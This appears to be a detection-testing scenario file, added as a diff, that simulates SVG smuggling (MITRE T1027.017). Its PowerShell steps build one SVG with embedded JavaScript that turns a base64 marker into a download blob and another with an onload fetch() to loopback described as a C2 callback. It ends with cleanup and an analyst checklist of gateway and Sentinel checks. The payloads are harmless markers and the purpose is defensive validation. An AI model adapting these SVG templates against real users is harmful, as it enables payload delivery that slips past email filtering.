@@ -1,0 +1,108 @@
+id: T1027.017_svg_smuggling
+name: "Obfuscated Files or Information — SVG Smuggling"
+mitre_technique: "T1027.017"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries embed malicious JavaScript inside SVG (Scalable Vector Graphics) files.
+  SVGs are XML-based image files that browsers render natively, and they can legitimately
+  contain <script> tags. When a victim opens or previews an SVG, the embedded script
+  executes — triggering downloads, redirects, or payload delivery. Email gateways
+  and web proxies often treat SVGs as images rather than executable content, bypassing
+  content filtering. This scenario creates functional SVG smuggling files and validates
+  gateway detection.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1027/017/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1027.017 — SVG Smuggling simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create an SVG with embedded JavaScript payload"
+    command: |
+      $svgPath = "$env:TEMP\PAS_T1027_017_image.svg"
+      $payloadB64 = [Convert]::ToBase64String(
+          [Text.Encoding]::UTF8.GetBytes("PAS-T1027-017-SVG-SMUGGLED-PAYLOAD`n"))
+
+      $svg = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"
+     xmlns:xlink="http://www.w3.org/1999/xlink">
+  <!-- Appears as a simple blue rectangle image -->
+  <rect width="200" height="200" fill="blue"/>
+  <text x="10" y="50" fill="white" font-size="12">PAS Test Image</text>
+  <script type="text/javascript">
+    //<![CDATA[
+    // SVG Smuggling payload — executes when SVG opened in browser
+    var payload = atob("$payloadB64");
+    var blob = new Blob([payload], {type: 'application/octet-stream'});
+    var url  = URL.createObjectURL(blob);
+    var a    = document.createElement('a');
+    a.href     = url;
+    a.download = 'PAS_svg_payload.txt';
+    // a.click() would auto-download — omitted in simulation
+    console.log('PAS-T1027.017: SVG script executed, payload ready: ' + payload.trim());
+    //]]>
+  </script>
+</svg>
+"@
+      Set-Content $svgPath $svg
+      Write-Host "[PAS] SVG smuggling file created: $svgPath"
+      Write-Host "[PAS] Contains: valid SVG image + embedded JavaScript with base64 payload"
+      Write-Host "[PAS] File extension: .svg — often treated as image by email gateways"
+
+  - step: 3
+    type: exec_powershell
+    description: "Demonstrate SVG with onload handler — alternative execution trigger"
+    command: |
+      $svgPath2 = "$env:TEMP\PAS_T1027_017_onload.svg"
+      $svg2 = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"
+     onload="fetch('http://127.0.0.1/PAS-T1027-017-ONLOAD')">
+</svg>
+"@
+      Set-Content $svgPath2 $svg2
+      Write-Host "[PAS] onload SVG created: $svgPath2"
+      Write-Host "[PAS] onload handler fires on render — triggers callback to attacker C2"
+      Write-Host "[PAS] Uses fetch() to loopback — no external traffic in this simulation"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check: submit SVG files to email gateway sandbox to validate detection; inspect file for <script> tag presence"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove SVG test files"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1027_017_image.svg"  -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1027_017_onload.svg" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] SVG files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1027.017 cleanup complete"
+
+analyst_checklist:
+  - "File event: .svg file created containing <script> tags — content inspection required"
+  - "CONTROL CHECK: Submit SVG files to Defender for Office 365 Safe Attachments and verify detonation occurs"
+  - "CONTROL CHECK: Email gateway should inspect SVG file content for <script> or 'onload=' attributes, not just extension"
+  - "CONTROL CHECK: SVGs delivered in ZIP or renamed as .jpg/.png should also be inspected"
+  - "Sentinel: DeviceFileEvents | where FileName endswith '.svg' — correlate with subsequent browser/process activity"
+  - "MDE: Browser network events — fetch() or XMLHttpRequest from SVG context to external host"
+  - "CONTROL CHECK: Web proxy should inspect SVG responses for embedded script content"
+  - "CONTROL CHECK: Microsoft Defender for Office 365 blocks SVG attachments by default in some tenants — verify policy"
